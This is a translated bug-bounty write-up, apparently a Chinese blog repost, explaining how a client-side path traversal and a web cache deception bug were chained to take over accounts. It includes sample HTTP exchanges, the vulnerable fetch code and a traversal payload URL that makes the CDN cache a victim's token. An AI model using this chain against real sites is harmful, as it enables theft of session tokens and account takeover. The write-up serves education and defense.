#  Cache Deception + CSPT：从“无影响”到账号接管的漏洞链  
Jorge Cerezo
                    Jorge Cerezo  securitainment   2026-02-03 14:12  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">原文链接</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://zere.es/posts/cache-deception-cspt-account-takeover/</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">Jorge Cerezo Dacosta</span></section></td></tr></tbody></table>  
最近在审计某个私有 Bug Bounty 项目的主应用时，我发现了一个 **Client-Side Path Traversal (CSPT)**  
和一个 **Cache Deception**  
漏洞。单独来看，这两个问题都无法利用，也没有实际影响；但当把它们串联起来时，我可以实现并演示 **Account Takeover**  
。  
  
在展开细节之前，如果你对这些概念不熟，我强烈建议先阅读以下资料：  
  
**关于 CSPT：**  
- Matan Berson's excellent introduction to CSPT – 从基础出发，对该概念进行系统且全面的讲解。  
  
- My CSPT talk in Spanish – 如果你会西班牙语，我在这里介绍了基础概念与一些实战场景。  
  
- Maxence Schmitt 的这份精彩 CSPT 分享  
  
**关于 Cache Deception：**  
- https://portswigger.net/web-security/web-cache-deception  
  
## 缓存欺骗 (Cache Deception)  
  
在初步侦察阶段，我发现了下面这个请求：  
```
GET /v1/token HTTP/1.1Host: api.example.comX-Auth-Token: <REDACTED>Accept: application/jsonAccept-Encoding: gzip, deflate, br
```  
```
HTTP/1.1 200 OKContent-Type: application/jsonCache-Control: no-cache, no-store, must-revalidateX-Cache: Miss from cdnConnection: keep-alive{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```  
  
由于该 endpoint 会返回敏感数据，我决定通过添加 .css  
扩展名来测试它是否存在 **Cache Deception**  
：  
```
GET /v1/token.css HTTP/1.1Host: api.example.comX-Auth-Token: <REDACTED>Accept: application/jsonAccept-Encoding: gzip, deflate, br
```  
```
HTTP/1.1 200 OKContent-Type: application/jsonCache-Control: max-age=86400, publicX-Cache: Hit from cdnConnection: keep-alive{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```  
  
可以看到，响应内容完全一致，并且被缓存了。这表明该 endpoint 确实存在缓存欺骗漏洞。  
  
但问题是：它需要 X-Auth-Token  
header，而当用户直接访问一个 URL 时，浏览器无法“自动带上”这个 header。这使得缓存欺骗漏洞本身无法被利用，因为攻击者无法强制受害者的浏览器在请求中附带其认证 token。  
## 客户端路径穿越 (Client-Side Path Traversal)  
  
在审查前端代码时，我发现了下面这段 JavaScript：  
```
consturlParams=newURLSearchParams(window.location.search);constuserId=urlParams.get('userId');constapiUrl=`https://api.example.com/v1/users/info/${userId}`;fetch(apiUrl, {method:'GET',headers: {'X-Auth-Token': authToken  }}).then(response=>response.json()).then(data=> {displayUSERData(data);}).catch(err=>console.error("Error loading user info:", err));
```  
  
这就是一个典型的 **Client-Side Path Traversal**  
漏洞：userId  
参数被直接拼接进 API URL，且没有进行任何路径穿越相关的校验或过滤。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMz7NMwicVibwER34ibqxRf7ysue5fKibymjiaiaVFPiaq3ukSx9RfpVeFalmic0pWw7GMA87Lt3E38UiaeNqQ/640?wx_fmt=png&from=appmsg "")  
  
因此，我可以控制一个发往 API 的、带认证信息的 **authenticated**  
请求的路径。但“控制路径”具体能做什么？我既没找到 open redirect，也无法操纵任何 API 响应的 body。单独来看，这个 CSPT 仍然无法利用。  
## 漏洞链 (The Chain)  
  
此时我意识到：如果把这两个发现组合起来会怎样？  
  
**CSPT**  
允许我控制一个包含 X-Auth-Token  
header 的 authenticated API 请求路径；而 **Cache Deception**  
则恰好需要这个 header 的存在，才能把敏感数据写进缓存。  
  
换句话说：**如果我用 CSPT 让浏览器对“可缓存的敏感 endpoint”发起一次 authenticated 请求呢？**  
  
为了验证这个思路，我构造了一个 **CSPT**  
payload，让它路径穿越到可缓存的 endpoint：  
```
https://example.com/user?id=../../../v1/token.css
```  
  
当用户访问该 URL 时，JavaScript 会构造出：  
```
https://api.example.com/v1/users/info/../../../v1/token.css
```  
  
它最终会解析为：  
```
https://api.example.com/v1/token.css
```  
  
关键点在于：这个请求会包含用户的 **X-Auth-Token**  
header。因此当 CSPT 被触发时，它会向可缓存的 endpoint 发送一个 authenticated 请求。  
  
API 返回敏感的 token 数据，CDN 随后缓存该响应。  
  
接下来，任何人(包括未认证用户)只要访问 https://api.example.com/v1/token.css  
，CDN 就会返回受害者缓存下来的敏感数据，其中包含其 token，从而导致账号接管。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMz7NMwicVibwER34ibqxRf7ysiclqyibianicoNdLh1H1rm8XkAmU9ONHABZ3rEZ1zpia87XLz17gkdnyZ0w/640?wx_fmt=png&from=appmsg "")  
## 结论 (Conclusion)  
  
希望这条攻击链能带来一些启发：看似“单独没有影响”的小漏洞，一旦组合起来，就可能造成非常严重的安全风险。这也说明了为什么我们需要跳出单点安全机制去思考，以及为什么不应忽视那些表面上无法利用的发现。在很多情况下，最危险的攻击恰恰来自多个“单看无害”的漏洞链式组合。  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
  
